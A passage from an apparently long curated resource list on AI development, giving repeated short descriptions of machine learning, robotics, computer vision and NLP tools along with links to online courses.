fly. A graph optimization layer on top of that makes symbolic execution fast and memory efficient. MXNet is portable and lightweight, scaling effectively to multiple GPUs and multiple machines. Support for Python, R, Julia, Scala, Go, Javascript and more. AutoGluon is toolkit for Deep learning that automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy deep learning models on tabular, image, and text data. Anaconda is a very popular Data Science platform for machine learning and deep learning that enables users to develop models, train them, and deploy them. PlaidML is an advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices where the available computing hardware is not well supported or the available software stack contains unpalatable license restrictions. OpenCV is a highly optimized library with focus on real-time computer vision applications. The C++, Python, and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. Weka is an open source machine learning software that can be accessed through a graphical user interface, standard terminal applications, or a Java API. It is widely used for teaching, research, and industrial applications, contains a plethora of built-in tools for standard machine learning tasks, and additionally gives transparent access to well-known toolboxes such as scikit-learn, R, and Deeplearning4j. Caffe is a deep learning framework made with expression, speed, and modularity in mind. It is developed by Berkeley AI Research (BAIR)/The Berkeley Vision and Learning Center (BVLC) and community contributors. Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently including tight integration with NumPy. Microsoft Project Bonsai is a low-code AI platform that speeds AI-powered automation development and part of the Autonomous Systems suite from Microsoft. Bonsai is used to build AI components that can provide operator guidance or make independent decisions to optimize process variables, improve production efficiency, and reduce downtime. Microsoft AirSim is a simulator for drones, cars and more, built on Unreal Engine (with an experimental Unity release). AirSim is open-source, cross platform, and supports software-in-the-loop simulation with popular flight controllers such as PX4 & ArduPilot and hardware-in-loop with PX4 for physically and visually realistic simulations. It is developed as an Unreal plugin that can simply be dropped into any Unreal environment. AirSim is being developed  as a platform for AI research to experiment with deep learning, computer vision and reinforcement learning algorithms for autonomous vehicles. CARLA is an open-source simulator for autonomous driving research. CARLA has been developed from the ground up to support development, training, and validation of autonomous driving systems. In addition to open-source code and protocols, CARLA provides open digital assets (urban layouts, buildings, vehicles) that were created for this purpose and can be used freely. ROS/ROS2 bridge for CARLA(package) is a bridge that enables two-way communication between ROS and CARLA. The information from the CARLA server is translated to ROS topics. In the same way, the messages sent between nodes in ROS get translated to commands to be applied in CARLA. ROS Toolbox is a tool that provides an interface connecting MATLAB® and Simulink® with the Robot Operating System (ROS and ROS 2), enabling you to create a network of ROS nodes. The toolbox includes MATLAB functions and Simulink blocks to import, analyze, and play back ROS data recorded in rosbag files. You can also connect to a live ROS network to access ROS messages. Robotics Toolbox™ provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Image Processing Toolbox™ is a tool that provides a comprehensive set of reference-standard algorithms and workflow apps for image processing, analysis, visualization, and algorithm development. You can perform image segmentation, image enhancement, noise reduction, geometric transformations, image registration, and 3D image processing. Computer Vision Toolbox™ is a tool that provides algorithms, functions, and apps for designing and testing computer vision, 3D vision, and video processing systems. You can perform object detection and tracking, as well as feature detection, extraction, and matching. You can automate calibration workflows for single, stereo, and fisheye cameras. For 3D vision, the toolbox supports visual and point cloud SLAM, stereo vision, structure from motion, and point cloud processing. Robotics Toolbox™ is a tool that provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Model Predictive Control Toolbox™ is a tool that provides functions, an app, and Simulink® blocks for designing and simulating controllers using linear and nonlinear model predictive control (MPC). The toolbox lets you specify plant and disturbance models, horizons, constraints, and weights. By running closed-loop simulations, you can evaluate controller performance. Predictive Maintenance Toolbox™  is a tool that lets you manage sensor data, design condition indicators, and estimate the remaining useful life (RUL) of a machine. The toolbox provides functions and an interactive app for exploring, extracting, and ranking features using data-based and model-based techniques, including statistical, spectral, and time-series analysis. Vision HDL Toolbox™ is a tool that provides pixel-streaming algorithms for the design and implementation of vision systems on FPGAs and ASICs. It provides a design framework that supports a diverse set of interface types, frame sizes, and frame rates. The image processing, video, and computer vision algorithms in the toolbox use an architecture appropriate for HDL implementations. Automated Driving Toolbox™ is a MATLAB tool that provides algorithms and tools for designing, simulating, and testing ADAS and autonomous driving systems. You can design and test vision and lidar perception systems, as well as sensor fusion, path planning, and vehicle controllers. Visualization tools include a bird’s-eye-view plot and scope for sensor coverage, detections and tracks, and displays for video, lidar, and maps. The toolbox lets you import and work with HERE HD Live Map data and OpenDRIVE® road networks. It also provides reference application examples for common ADAS and automated driving features, including FCW, AEB, ACC, LKA, and parking valet. The toolbox supports C/C++ code generation for rapid prototyping and HIL testing, with support for sensor fusion, tracking, path planning, and vehicle controller algorithms. UAV Toolbox is an application that provides tools and reference applications for designing, simulating, testing, and deploying unmanned aerial vehicle (UAV) and drone applications. You can design autonomous flight algorithms, UAV missions, and flight controllers. The Flight Log Analyzer app lets you interactively analyze 3D flight paths, telemetry information, and sensor readings from common flight log formats. Navigation Toolbox™ is a tool that provides algorithms and analysis tools for motion planning, simultaneous localization and mapping (SLAM), and inertial navigation. The toolbox includes customizable search and sampling-based path planners, as well as metrics for validating and comparing paths. You can create 2D and 3D map representations, generate maps using SLAM algorithms, and interactively visualize and debug map generation with the SLAM map builder app. Lidar Toolbox™ is a tool that provides algorithms, functions, and apps for designing, analyzing, and testing lidar processing systems. You can perform object detection and tracking, semantic segmentation, shape fitting, lidar registration, and obstacle detection. Lidar Toolbox supports lidar-camera cross calibration for workflows that combine computer vision and lidar processing. Mapping Toolbox™ is a tool that provides algorithms and functions for transforming geographic data and creating map displays. You can visualize your data in a geographic context, build map displays from more than 60 map projections, and transform data from a variety of sources into a consistent geographic coordinate system. Reinforcement Learning Development Back to the Top     Reinforcement Learning Learning Resources Reinforcement Learning is a subset of machine learning, which is a neural network with three or more layers. These neural networks attempt to simulate the behavior of the human brain,though, far from matching its ability. This allows the neural networks to ""learn"" from a process in which a model learns to become more accurate for performing an action in an environment based on feedback in order to maximize the reward. The Learning can be supervised, semi-supervised or unsupervised. Top Reinforcement Learning Courses | Coursera Top Reinforcement Learning Courses | Udemy Top Reinforcement Learning Courses | Udacity Reinforcement Learning Courses | Stanford Online Deep Learning Online Courses | NVIDIA Top Deep Learning Courses Online | Coursera Top Deep Learning Courses Online | Udemy Learn Deep Learning with Online Courses and Lessons | edX Deep Learning Online Course Nanodegree | Udacity Machine Learning Course by Andrew Ng | Coursera Machine Learning Engineering for Production (MLOps) course by Andrew Ng | Coursera Data Science: Deep Learning and Neural Networks in Python | Udemy Understanding Machine Learning with Python | Pluralsight  How to Think About Machine Learning Algorithms | Pluralsight Deep Learning Courses | Stanford Online Deep Learning - UW Professional & Continuing Education Deep Learning Online Courses | Harvard University Machine Learning for Everyone Courses | DataCamp Artificial Intelligence Expert Course: Platinum Edition | Udemy Top Artificial Intelligence Courses Online | Coursera Learn Artificial Intelligence with Online Courses and Lessons | edX Professional Certificate in Computer Science for Artificial Intelligence | edX Artificial Intelligence Nanodegree program Artificial Intelligence (AI) Online Courses | Udacity Intro to Artificial Intelligence Course | Udacity Edge AI for IoT Developers Course | Udacity Reasoning: Goal Trees and Rule-Based Expert Systems | MIT OpenCourseWare Expert Systems and Applied Artificial Intelligence Autonomous Systems - Microsoft AI Introduction to Microsoft Project Bonsai Machine teaching with the Microsoft Autonomous Systems platform Autonomous Maritime Systems Training | AMC Search Top Autonomous Cars Courses Online | Udemy Applied Control Systems 1: autonomous cars: Math + PID + MPC | Udemy Learn Autonomous Robotics with Online Courses and Lessons | edX Artificial Intelligence Nanodegree program Autonomous Systems Online Courses & Programs | Udacity Edge AI for IoT Developers Course | Udacity Autonomous Systems MOOC and Free Online Courses | MOOC List Robotics and Autonomous Systems Graduate Program | Standford Online Mobile Autonomous Systems Laboratory | MIT OpenCourseWare Reinforcement Learning Tools, Libraries, and Frameworks OpenAI is an open source Python library for developing and comparing reinforcement learning algorithms by providing a standard API to communicate between learning algorithms and environments, as well as a standard set of environments compliant with that API. ReinforcementLearning.jl is a collection of tools for doing reinforcement learning research in Julia. Reinforcement Learning Toolbox™ is a tool that provides an app, functions, and a Simulink® block for training policies using reinforcement learning algorithms, including DQN, PPO, SAC, and DDPG. You can use these policies to implement controllers and decision-making algorithms for complex applications such as resource allocation, robotics, and autonomous systems. Amazon SageMaker is a fully managed service that provides every developer and data scientist with the ability to build, train, and deploy machine learning (ML) models quickly. AWS RoboMaker is a service that provides a fully-managed, scalable infrastructure for simulation that customers use for multi-robot simulation and CI/CD integration with regression testing in simulation. TensorFlow is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML powered applications. Keras is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano.It was developed with a focus on enabling fast experimentation. It is capable of running on top of TensorFlow, Microsoft Cognitive Toolkit, R, Theano, or PlaidML. PyTorch is a library for deep learning on irregular input data such as graphs, point clouds, and manifolds. Primarily developed by Facebook's AI Research lab. Scikit-Learn is a simple and efficient tool for data mining and data analysis. It is built on NumPy,SciPy, and mathplotlib. NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Jupyter is used widely in industries that do data cleaning and transformation, numerical simulation, statistical modeling, data visualization, data science, and machine learning. Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Cluster Manager for Apache Kafka(CMAK) is a tool for managing Apache Kafka clusters. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Eclipse Deeplearning4J (DL4J) is a set of projects intended to support all the needs of a JVM-based(Scala, Kotlin, Clojure, and Groovy) deep learning application. This means starting with the raw data, loading and preprocessing it from wherever and whatever format it is in to building and tuning a wide variety of simple and complex deep learning networks. Deep Learning Toolbox™ is a tool that provides a framework for designing and implementing deep neural networks with algorithms, pretrained models, and apps. You can use convolutional neural networks (ConvNets, CNNs) and long short-term memory (LSTM) networks to perform classification and regression on image, time-series, and text data. You can build network architectures such as generative adversarial networks (GANs) and Siamese networks using automatic differentiation, custom training loops, and shared weights. With the Deep Network Designer app, you can design, analyze, and train networks graphically. It can exchange models with TensorFlow™ and PyTorch through the ONNX format and import models from TensorFlow-Keras and Caffe. The toolbox supports transfer learning with DarkNet-53, ResNet-50, NASNet, SqueezeNet and many other pretrained models. Deep Learning HDL Toolbox™ is a tool that provides functions and tools to prototype and implement deep learning networks on FPGAs and SoCs. It provides pre-built bitstreams for running a variety of deep learning networks on supported Xilinx® and Intel® FPGA and SoC devices. Profiling and estimation tools let you customize a deep learning network by exploring design, performance, and resource utilization tradeoffs. Parallel Computing Toolbox™ is a tool that lets you solve computationally and data-intensive problems using multicore processors, GPUs, and computer clusters. High-level constructs such as parallel for-loops, special array types, and parallelized numerical algorithms enable you to parallelize MATLAB® applications without CUDA or MPI programming. The toolbox lets you use parallel-enabled functions in MATLAB and other toolboxes. You can use the toolbox with Simulink® to run multiple simulations of a model in parallel. Programs and models can run in both interactive and batch modes. XGBoost is an optimized distributed gradient boosting library designed to be highly efficient, flexible and portable. It implements machine learning algorithms under the Gradient Boosting framework. XGBoost provides a parallel tree boosting (also known as GBDT, GBM) that solve many data science problems in a fast and accurate way. It supports distributed training on multiple machines, including AWS, GCE, Azure, and Yarn clusters. Also, it can be integrated with Flink, Spark and other cloud dataflow systems. LIBSVM is an integrated software for support vector classification, (C-SVC, nu-SVC), regression (epsilon-SVR, nu-SVR) and distribution estimation (one-class SVM). It supports multi-class classification. Azure Databricks is a fast and collaborative Apache Spark-based big data analytics service designed for data science and data engineering. Azure Databricks, sets up your Apache Spark environment in minutes, autoscale, and collaborate on shared projects in an interactive workspace. Azure Databricks supports Python, Scala, R, Java, and SQL, as well as data science frameworks and libraries including TensorFlow, PyTorch, and scikit-learn. Microsoft Cognitive Toolkit (CNTK) is an open-source toolkit for commercial-grade distributed deep learning. It describes neural networks as a series of computational steps via a directed graph. CNTK allows the user to easily realize and combine popular model types such as feed-forward DNNs, convolutional neural networks (CNNs) and recurrent neural networks (RNNs/LSTMs). CNTK implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. Tensorflow_macOS is a Mac-optimized version of TensorFlow and TensorFlow Addons for macOS 11.0+ accelerated using Apple's ML Compute framework. Apache Airflow is an open-source workflow management platform created by the community to programmatically author, schedule and monitor workflows. Install. Principles. Scalable. Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers. Airflow is ready to scale to infinity. Open Neural Network Exchange(ONNX) is an open ecosystem that empowers AI developers to choose the right tools as their project evolves. ONNX provides an open source format for AI models, both deep learning and traditional ML. It defines an extensible computation graph model, as well as definitions of built-in operators and standard data types. Apache MXNet is a deep learning framework designed for both efficiency and flexibility. It allows you to mix symbolic and imperative programming to maximize efficiency and productivity. At its core, MXNet contains a dynamic dependency scheduler that automatically parallelizes both symbolic and imperative operations on the fly. A graph optimization layer on top of that makes symbolic execution fast and memory efficient. MXNet is portable and lightweight, scaling effectively to multiple GPUs and multiple machines. Support for Python, R, Julia, Scala, Go, Javascript and more. AutoGluon is toolkit for Deep learning that automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy deep learning models on tabular, image, and text data. Anaconda is a very popular Data Science platform for machine learning and deep learning that enables users to develop models, train them, and deploy them. PlaidML is an advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices where the available computing hardware is not well supported or the available software stack contains unpalatable license restrictions. OpenCV is a highly optimized library with focus on real-time computer vision applications. The C++, Python, and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. Weka is an open source machine learning software that can be accessed through a graphical user interface, standard terminal applications, or a Java API. It is widely used for teaching, research, and industrial applications, contains a plethora of built-in tools for standard machine learning tasks, and additionally gives transparent access to well-known toolboxes such as scikit-learn, R, and Deeplearning4j. Caffe is a deep learning framework made with expression, speed, and modularity in mind. It is developed by Berkeley AI Research (BAIR)/The Berkeley Vision and Learning Center (BVLC) and community contributors. Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently including tight integration with NumPy. Microsoft Project Bonsai is a low-code AI platform that speeds AI-powered automation development and part of the Autonomous Systems suite from Microsoft. Bonsai is used to build AI components that can provide operator guidance or make independent decisions to optimize process variables, improve production efficiency, and reduce downtime. Microsoft AirSim is a simulator for drones, cars and more, built on Unreal Engine (with an experimental Unity release). AirSim is open-source, cross platform, and supports software-in-the-loop simulation with popular flight controllers such as PX4 & ArduPilot and hardware-in-loop with PX4 for physically and visually realistic simulations. It is developed as an Unreal plugin that can simply be dropped into any Unreal environment. AirSim is being developed  as a platform for AI research to experiment with deep learning, computer vision and reinforcement learning algorithms for autonomous vehicles. CARLA is an open-source simulator for autonomous driving research. CARLA has been developed from the ground up to support development, training, and validation of autonomous driving systems. In addition to open-source code and protocols, CARLA provides open digital assets (urban layouts, buildings, vehicles) that were created for this purpose and can be used freely. ROS/ROS2 bridge for CARLA(package) is a bridge that enables two-way communication between ROS and CARLA. The information from the CARLA server is translated to ROS topics. In the same way, the messages sent between nodes in ROS get translated to commands to be applied in CARLA. ROS Toolbox is a tool that provides an interface connecting MATLAB® and Simulink® with the Robot Operating System (ROS and ROS 2), enabling you to create a network of ROS nodes. The toolbox includes MATLAB functions and Simulink blocks to import, analyze, and play back ROS data recorded in rosbag files. You can also connect to a live ROS network to access ROS messages. Robotics Toolbox™ provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Image Processing Toolbox™ is a tool that provides a comprehensive set of reference-standard algorithms and workflow apps for image processing, analysis, visualization, and algorithm development. You can perform image segmentation, image enhancement, noise reduction, geometric transformations, image registration, and 3D image processing. Computer Vision Toolbox™ is a tool that provides algorithms, functions, and apps for designing and testing computer vision, 3D vision, and video processing systems. You can perform object detection and tracking, as well as feature detection, extraction, and matching. You can automate calibration workflows for single, stereo, and fisheye cameras. For 3D vision, the toolbox supports visual and point cloud SLAM, stereo vision, structure from motion, and point cloud processing. Robotics Toolbox™ is a tool that provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Model Predictive Control Toolbox™ is a tool that provides functions, an app, and Simulink® blocks for designing and simulating controllers using linear and nonlinear model predictive control (MPC). The toolbox lets you specify plant and disturbance models, horizons, constraints, and weights. By running closed-loop simulations, you can evaluate controller performance. Predictive Maintenance Toolbox™  is a tool that lets you manage sensor data, design condition indicators, and estimate the remaining useful life (RUL) of a machine. The toolbox provides functions and an interactive app for exploring, extracting, and ranking features using data-based and model-based techniques, including statistical, spectral, and time-series analysis. Vision HDL Toolbox™ is a tool that provides pixel-streaming algorithms for the design and implementation of vision systems on FPGAs and ASICs. It provides a design framework that supports a diverse set of interface types, frame sizes, and frame rates. The image processing, video, and computer vision algorithms in the toolbox use an architecture appropriate for HDL implementations. Automated Driving Toolbox™ is a MATLAB tool that provides algorithms and tools for designing, simulating, and testing ADAS and autonomous driving systems. You can design and test vision and lidar perception systems, as well as sensor fusion, path planning, and vehicle controllers. Visualization tools include a bird’s-eye-view plot and scope for sensor coverage, detections and tracks, and displays for video, lidar, and maps. The toolbox lets you import and work with HERE HD Live Map data and OpenDRIVE® road networks. It also provides reference application examples for common ADAS and automated driving features, including FCW, AEB, ACC, LKA, and parking valet. The toolbox supports C/C++ code generation for rapid prototyping and HIL testing, with support for sensor fusion, tracking, path planning, and vehicle controller algorithms. Navigation Toolbox™ is a tool that provides algorithms and analysis tools for motion planning, simultaneous localization and mapping (SLAM), and inertial navigation. The toolbox includes customizable search and sampling-based path planners, as well as metrics for validating and comparing paths. You can create 2D and 3D map representations, generate maps using SLAM algorithms, and interactively visualize and debug map generation with the SLAM map builder app. UAV Toolbox is an application that provides tools and reference applications for designing, simulating, testing, and deploying unmanned aerial vehicle (UAV) and drone applications. You can design autonomous flight algorithms, UAV missions, and flight controllers. The Flight Log Analyzer app lets you interactively analyze 3D flight paths, telemetry information, and sensor readings from common flight log formats. Lidar Toolbox™ is a tool that provides algorithms, functions, and apps for designing, analyzing, and testing lidar processing systems. You can perform object detection and tracking, semantic segmentation, shape fitting, lidar registration, and obstacle detection. Lidar Toolbox supports lidar-camera cross calibration for workflows that combine computer vision and lidar processing. Mapping Toolbox™ is a tool that provides algorithms and functions for transforming geographic data and creating map displays. You can visualize your data in a geographic context, build map displays from more than 60 map projections, and transform data from a variety of sources into a consistent geographic coordinate system. Computer Vision Development Back to the Top     Computer Vision Learning Resources Computer Vision is a field of Artificial Intelligence (AI) that focuses on enabling computers to identify and understand objects and people in images and videos. OpenCV Courses Exploring Computer Vision in Microsoft Azure Top Computer Vision Courses Online | Coursera Top Computer Vision Courses Online | Udemy Learn Computer Vision with Online Courses and Lessons | edX Computer Vision and Image Processing Fundamentals | edX Introduction to Computer Vision Courses | Udacity Computer Vision Nanodegree program | Udacity Machine Vision Course |MIT Open Courseware  Computer Vision Training Courses | NobleProg Visual Computing Graduate Program | Stanford Online Computer Vision Tools, Libraries, and Frameworks OpenCV is a highly optimized library with focus on real-time computer vision applications. The C++, Python, and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Microsoft Cognitive Toolkit (CNTK) is an open-source toolkit for commercial-grade distributed deep learning. It describes neural networks as a series of computational steps via a directed graph. CNTK allows the user to easily realize and combine popular model types such as feed-forward DNNs, convolutional neural networks (CNNs) and recurrent neural networks (RNNs/LSTMs). CNTK implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. Automated Driving Toolbox™ is a MATLAB tool that provides algorithms and tools for designing, simulating, and testing ADAS and autonomous driving systems. You can design and test vision and lidar perception systems, as well as sensor fusion, path planning, and vehicle controllers. Visualization tools include a bird’s-eye-view plot and scope for sensor coverage, detections and tracks, and displays for video, lidar, and maps. The toolbox lets you import and work with HERE HD Live Map data and OpenDRIVE® road networks. It also provides reference application examples for common ADAS and automated driving features, including FCW, AEB, ACC, LKA, and parking valet. The toolbox supports C/C++ code generation for rapid prototyping and HIL testing, with support for sensor fusion, tracking, path planning, and vehicle controller algorithms. LRSLibrary is a Low-Rank and Sparse Tools for Background Modeling and Subtraction in Videos. The library was designed for moving object detection in videos, but it can be also used for other computer vision and machine learning problems. Image Processing Toolbox™ is a tool that provides a comprehensive set of reference-standard algorithms and workflow apps for image processing, analysis, visualization, and algorithm development. You can perform image segmentation, image enhancement, noise reduction, geometric transformations, image registration, and 3D image processing. Computer Vision Toolbox™ is a tool that provides algorithms, functions, and apps for designing and testing computer vision, 3D vision, and video processing systems. You can perform object detection and tracking, as well as feature detection, extraction, and matching. You can automate calibration workflows for single, stereo, and fisheye cameras. For 3D vision, the toolbox supports visual and point cloud SLAM, stereo vision, structure from motion, and point cloud processing. Statistics and Machine Learning Toolbox™ is a tool that provides functions and apps to describe, analyze, and model data. You can use descriptive statistics, visualizations, and clustering for exploratory data analysis; fit probability distributions to data; generate random numbers for Monte Carlo simulations, and perform hypothesis tests. Regression and classification algorithms let you draw inferences from data and build predictive models either interactively, using the Classification and Regression Learner apps, or programmatically, using AutoML. Lidar Toolbox™ is a tool that provides algorithms, functions, and apps for designing, analyzing, and testing lidar processing systems. You can perform object detection and tracking, semantic segmentation, shape fitting, lidar registration, and obstacle detection. Lidar Toolbox supports lidar-camera cross calibration for workflows that combine computer vision and lidar processing. Mapping Toolbox™ is a tool that provides algorithms and functions for transforming geographic data and creating map displays. You can visualize your data in a geographic context, build map displays from more than 60 map projections, and transform data from a variety of sources into a consistent geographic coordinate system. UAV Toolbox is an application that provides tools and reference applications for designing, simulating, testing, and deploying unmanned aerial vehicle (UAV) and drone applications. You can design autonomous flight algorithms, UAV missions, and flight controllers. The Flight Log Analyzer app lets you interactively analyze 3D flight paths, telemetry information, and sensor readings from common flight log formats. Parallel Computing Toolbox™ is a tool that lets you solve computationally and data-intensive problems using multicore processors, GPUs, and computer clusters. High-level constructs such as parallel for-loops, special array types, and parallelized numerical algorithms enable you to parallelize MATLAB® applications without CUDA or MPI programming. The toolbox lets you use parallel-enabled functions in MATLAB and other toolboxes. You can use the toolbox with Simulink® to run multiple simulations of a model in parallel. Programs and models can run in both interactive and batch modes. Partial Differential Equation Toolbox™ is a tool that provides functions for solving structural mechanics, heat transfer, and general partial differential equations (PDEs) using finite element analysis. ROS Toolbox is a tool that provides an interface connecting MATLAB® and Simulink® with the Robot Operating System (ROS and ROS 2), enabling you to create a network of ROS nodes. The toolbox includes MATLAB functions and Simulink blocks to import, analyze, and play back ROS data recorded in rosbag files. You can also connect to a live ROS network to access ROS messages. Robotics Toolbox™ provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Deep Learning Toolbox™ is a tool that provides a framework for designing and implementing deep neural networks with algorithms, pretrained models, and apps. You can use convolutional neural networks (ConvNets, CNNs) and long short-term memory (LSTM) networks to perform classification and regression on image, time-series, and text data. You can build network architectures such as generative adversarial networks (GANs) and Siamese networks using automatic differentiation, custom training loops, and shared weights. With the Deep Network Designer app, you can design, analyze, and train networks graphically. It can exchange models with TensorFlow™ and PyTorch through the ONNX format and import models from TensorFlow-Keras and Caffe. The toolbox supports transfer learning with DarkNet-53, ResNet-50, NASNet, SqueezeNet and many other pretrained models. Reinforcement Learning Toolbox™ is a tool that provides an app, functions, and a Simulink® block for training policies using reinforcement learning algorithms, including DQN, PPO, SAC, and DDPG. You can use these policies to implement controllers and decision-making algorithms for complex applications such as resource allocation, robotics, and autonomous systems. Deep Learning HDL Toolbox™ is a tool that provides functions and tools to prototype and implement deep learning networks on FPGAs and SoCs. It provides pre-built bitstreams for running a variety of deep learning networks on supported Xilinx® and Intel® FPGA and SoC devices. Profiling and estimation tools let you customize a deep learning network by exploring design, performance, and resource utilization tradeoffs. Model Predictive Control Toolbox™ is a tool that provides functions, an app, and Simulink® blocks for designing and simulating controllers using linear and nonlinear model predictive control (MPC). The toolbox lets you specify plant and disturbance models, horizons, constraints, and weights. By running closed-loop simulations, you can evaluate controller performance. Vision HDL Toolbox™ is a tool that provides pixel-streaming algorithms for the design and implementation of vision systems on FPGAs and ASICs. It provides a design framework that supports a diverse set of interface types, frame sizes, and frame rates. The image processing, video, and computer vision algorithms in the toolbox use an architecture appropriate for HDL implementations. Data Acquisition Toolbox™ is a tool that provides apps and functions for configuring data acquisition hardware, reading data into MATLAB® and Simulink®, and writing data to DAQ analog and digital output channels. The toolbox supports a variety of DAQ hardware, including USB, PCI, PCI Express®, PXI®, and PXI Express® devices, from National Instruments® and other vendors. Microsoft AirSim is a simulator for drones, cars and more, built on Unreal Engine (with an experimental Unity release). AirSim is open-source, cross platform, and supports software-in-the-loop simulation with popular flight controllers such as PX4 & ArduPilot and hardware-in-loop with PX4 for physically and visually realistic simulations. It is developed as an Unreal plugin that can simply be dropped into any Unreal environment. AirSim is being developed  as a platform for AI research to experiment with deep learning, computer vision and reinforcement learning algorithms for autonomous vehicles. NLP Development Back to the Top     NLP Learning Resources Natural Language Processing (NLP) is a branch of artificial intelligence (AI) focused on giving computers the ability to understand text and spoken words in much the same way human beings can. NLP combines computational linguistics rule-based modeling of human language with statistical, machine learning, and deep learning models. Natural Language Processing With Python's NLTK Package Cognitive Services—APIs for AI Developers | Microsoft Azure Artificial Intelligence Services - Amazon Web Services (AWS) Google Cloud Natural Language API Top Natural Language Processing Courses Online | Udemy Introduction to Natural Language Processing (NLP) | Udemy Top Natural Language Processing Courses | Coursera Natural Language Processing | Coursera Natural Language Processing in TensorFlow | Coursera Learn Natural Language Processing with Online Courses and Lessons | edX Build a Natural Language Processing Solution with Microsoft Azure | Pluralsight Natural Language Processing (NLP) Training Courses | NobleProg Natural Language Processing with Deep Learning Course | Standford Online Advanced Natural Language Processing - MIT OpenCourseWare Certified Natural Language Processing Expert Certification | IABAC Natural Language Processing Course - Intel NLP Tools, Libraries, and Frameworks Natural Language Toolkit (NLTK) is a leading platform for building Python programs to work with human language data. It provides easy-to-use interfaces to over 50 corpora and lexical resources such as WordNet, along with a suite of text processing libraries for classification, tokenization, stemming, tagging, parsing, and semantic reasoning, wrappers for industrial-strength NLP libraries. spaCy is a library for advanced Natural Language Processing in Python and Cython. It's built on the very latest research, and was designed from day one to be used in real products. spaCy comes with pretrained pipelines and currently supports tokenization and training for 60+ 